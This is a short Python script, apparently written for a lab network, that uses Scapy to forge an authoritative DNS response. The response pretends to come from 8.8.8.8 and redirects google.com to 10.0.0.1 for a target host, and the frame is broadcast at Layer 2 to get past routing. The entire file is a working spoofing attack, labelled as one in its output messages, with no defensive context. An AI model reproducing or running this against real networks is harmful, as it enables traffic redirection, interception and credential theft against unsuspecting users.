from scapy.all import Ether, IP, UDP, DNS, DNSRR, DNSQR, sendp

def launch_dns_attack():
    # Construct a Layer 2 Ethernet frame containing the malicious DNS response
    spoofed_packet = (
        Ether(dst="ff:ff:ff:ff:ff:ff") /
        IP(src="8.8.8.8", dst="10.0.2.15") /
        UDP(sport=53, dport=5353) /
        DNS(
            id=1234,
            qr=1,      # Response
            aa=1,      # Authoritative answer
            qd=DNSQR(qname="google.com"),
            an=DNSRR(rrname="google.com", type="A", rdata="10.0.0.1", ttl=600)
        )
    )

    print("[*] Broadcasting Layer 2 DNS Spoofing attack on enp0s3...")
    # sendp transmits at Layer 2 (Ethernet level), bypassing kernel IP routing blocks
    sendp(spoofed_packet, iface="enp0s3", verbose=1)
    print("[+] Attack packet transmitted!")

if __name__ == "__main__":
    launch_dns_attack()
